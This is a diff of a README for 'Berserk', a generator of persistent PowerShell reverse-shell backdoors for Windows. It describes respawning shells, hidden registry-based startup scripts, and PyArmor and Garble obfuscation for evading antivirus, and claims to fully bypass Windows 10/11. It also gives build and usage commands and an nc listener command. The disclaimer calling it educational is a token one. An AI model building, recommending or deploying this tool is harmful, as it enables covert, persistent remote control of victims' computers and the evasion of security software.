@@ -1,77 +1,83 @@
 
 ![!\[Alt text\](<>)](<Berserk.jpg>)
 
+## 🚀 Features
 
-Greetings
--------------------------------------
+- Generates a PE binary (Windows) or a `.ps1` PowerShell script to launch a reverse shell.
+- Automatic persistence: if the process is killed, a new one is spawned.
+- Creates hidden startup scripts (Batch + VBS) using `reg.exe` (registry value: `Berserk`).
+- `-Ps` option: generates only the `.ps1` script.
+- Python executables obfuscated with **PyArmor**.
+- Go binaries obfuscated using **Garble**.
 
-Berserk a is Powershell rev-shell backdoor with persistence for windows and linux (pwsh)
+---
 
-it generates a PE exe that spawns a powershell process that starts a powershell rev-shell with persistence (if process stops an other one is spawned , if process is running don t spawn new process)
+## ⚙️ Prerequisites
 
-even if you exit break the shell you will the shell will always respawn on target
+- Python 3  
+- Go (for Go version)  
+- PyArmor (`pip install pyarmor`)  
+- Garble (`go install mvdan.cc/garble@latest`)  
+- patchelf (Linux): `sudo apt install patchelf`
 
-also it creates a Hidden batch and vbs file for persistent startup using reg.exe (value 'Berserk')
+---
 
-you can add -Ps (optional) to generate only a .ps1 file that do same thing
+## 📥 Installation
 
-run the.ps1 file like the following for persistent startup (you can also change name of file btw ,reg value 'Meow'):
+```bash
+git clone https://github.com/BenzoXdev/Berserk.git
+cd Berserk
+pip install -r requirements.txt
+export PATH="$PATH:$(go env GOPATH)/bin"
+```
+ 
+---
+
+🛠️ Usage
+
+Generate a Windows executable (Python-based)
+
+python3 Berserk.py -o your_binary.exe
+
+Generate an obfuscated Go binary
+
+python3 Berserk.py -go -o your_go_binary.exe
+
+Generate PowerShell script only
+
+python3 Berserk.py -Ps -o Berserk.ps1
+
+Persistent startup
+
+You can rename the file if desired:
 
 ./Berserk.ps1 -p
 
-note : it s preferable to use -go arg to build from a go file instead of python for better evasion
+> The default registry key value is Meow.
 
-(python compilation with nuitka , go compilation with garble )
 
-tested and fully bypass windows 10/11
---------------
-do not upload binaries to virus total ;)
 
-Update ! : 
--------------------------------------------
+Tip: On Linux, use wine to compile a Windows binary from a Python script.
 
-added obfuscation for the PE using Pyarmor
 
-added go binary build with garbel obfuscation
+---
 
-to do : 
+🎧 Listening for Connections
 
-add more options ( startup for linux...)
+nc -lvnp <port>
 
-Prerequisite:
----------------
 
-python
+---
 
-go (if you want to build golang binary)
+📖 Wine Tutorial
 
-SETUP :
----------------------
+See wine-tuto for more details.
 
-git clone https://github.com/BenzoXdev/Berserk
 
-cd Berserk
+---
 
-pip install -r requirements.txt
+⚠️ Disclaimer
 
-go install mvdan.cc/garble@latest
-
-export PATH=$PATH:~/go/bin
-
-sudo apt install patchelf (Linux)
-
-python3 Berserk.py -h
-
-(PS : if on linux and want to compile a python win binary use wine to compile ./dist/pewpew.py or pewpew.py or just compile it on a windows env) 
-
-tutorial: [wine-tuto](wine-tuto/wine.md)
--------------------
-
-how to listen for connections
-------------
-nc -lvnp 'port'
-
-DISCLAIMER :
-----------------------------------
-
-ME The author takes NO responsibility and/or liability for how you choose to use any of the tools/source code/any files provided. ME The author and anyone affiliated with will not be liable for any losses and/or damages in connection with use of Berserk. By using Berserk or any files included, you understand that you are AGREEING TO USE AT YOUR OWN RISK. Once again Berserk is for EDUCATION and/or RESEARCH purposes ONLY.
+The author takes NO responsibility for how you choose to use this tool.
+Berserk is provided “AS IS”, strictly for educational and research purposes only.
+Use it at your own risk.
